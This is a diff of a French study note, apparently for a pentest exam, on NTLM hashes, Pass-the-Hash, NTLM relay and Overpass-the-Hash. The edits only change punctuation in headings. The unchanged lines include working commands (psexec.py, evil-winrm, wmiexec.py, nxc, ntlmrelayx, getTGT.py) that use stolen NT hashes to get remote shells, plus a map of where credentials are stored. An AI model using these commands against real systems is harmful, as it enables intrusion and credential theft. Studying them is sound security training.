@@ -6,7 +6,7 @@ Imagine que pour entrer dans une salle, au lieu de dire ton mot de passe, tu env
 
 ---
 
-## Fonctionnement NTLM — Challenge/Réponse en 3 étapes
+## Fonctionnement NTLM : Challenge/Réponse en 3 étapes
 
 ```
 1. Client  →  Serveur  :  "Je veux me connecter"
@@ -33,11 +33,11 @@ Le serveur recalcule de son côté et compare. Si c'est identique → accès acc
 
 ---
 
-## Les deux types de hashes NTLM — distinction critique pour l'exam
+## Les deux types de hashes NTLM : distinction critique pour l'exam
 
 Il existe deux cas bien distincts que beaucoup confondent :
 
-### Cas 1 : NetNTLMv2 — capturé par Responder
+### Cas 1 : NetNTLMv2 : capturé par Responder
 
 Avec Responder, on capture du **NetNTLMv2** (challenge/réponse réseau).
 
@@ -52,7 +52,7 @@ Ce que tu peux faire avec :
 - ✅ **Relay NTLM** vers une autre machine
 - ❌ **PAS utilisable directement en Pass-the-Hash classique**
 
-### Cas 2 : NT Hash — extrait de SAM ou NTDS.dit
+### Cas 2 : NT Hash : extrait de SAM ou NTDS.dit
 
 Le **vrai** hash NT, stocké dans :
 
@@ -75,7 +75,7 @@ Ce que tu peux faire avec :
 
 ```
 ┌─────────────────────────────────────────────────────────────┐
-│ Schéma mental — NE PAS CONFONDRE                            │
+│ Schéma mental : NE PAS CONFONDRE                            │
 │                                                             │
 │ Responder capture                                           │
 │     ↓                                                       │
@@ -101,13 +101,13 @@ Tu utilises un **NT hash** directement pour t'authentifier à la place du mot de
 # Avec nxc (spray sur le réseau)
 nxc smb $TARGET -u $USER -H $NT_HASH -d $DOMAIN
 
-# Avec psexec — shell SYSTEM
+# Avec psexec : shell SYSTEM
 psexec.py -hashes :$NT_HASH $DOMAIN/$USER@$TARGET
 
-# Avec evil-winrm — shell WinRM
+# Avec evil-winrm : shell WinRM
 evil-winrm -i $TARGET -u $USER -H $NT_HASH
 
-# Avec wmiexec — plus discret
+# Avec wmiexec : plus discret
 wmiexec.py -hashes :$NT_HASH $DOMAIN/$USER@$TARGET
 ```
 
@@ -152,7 +152,7 @@ ntlmrelayx.py -tf targets.txt -smb2support -socks
 
 ## Overpass-the-Hash (OPtH)
 
-Transformer un NT hash en **ticket Kerberos TGT** — utile pour contourner les environnements qui filtrent NTLM.
+Transformer un NT hash en **ticket Kerberos TGT** : utile pour contourner les environnements qui filtrent NTLM.
 
 ```bash
 getTGT.py -hashes :$NT_HASH $DOMAIN_FQDN/$USER
@@ -169,7 +169,7 @@ klist
   └── SAM + SYSTEM   → hashes locaux  → PtH local
   └── LSASS (mémoire) → sessions actives (mdp en clair si WDigest activé)
 
-[Domaine — sur le DC]
+[Domaine : sur le DC]
   └── NTDS.dit + SYSTEM → tous les hashes AD → PtH domaine
   └── LSA Secrets (LSASS) → comptes de services, scheduled tasks
 ```
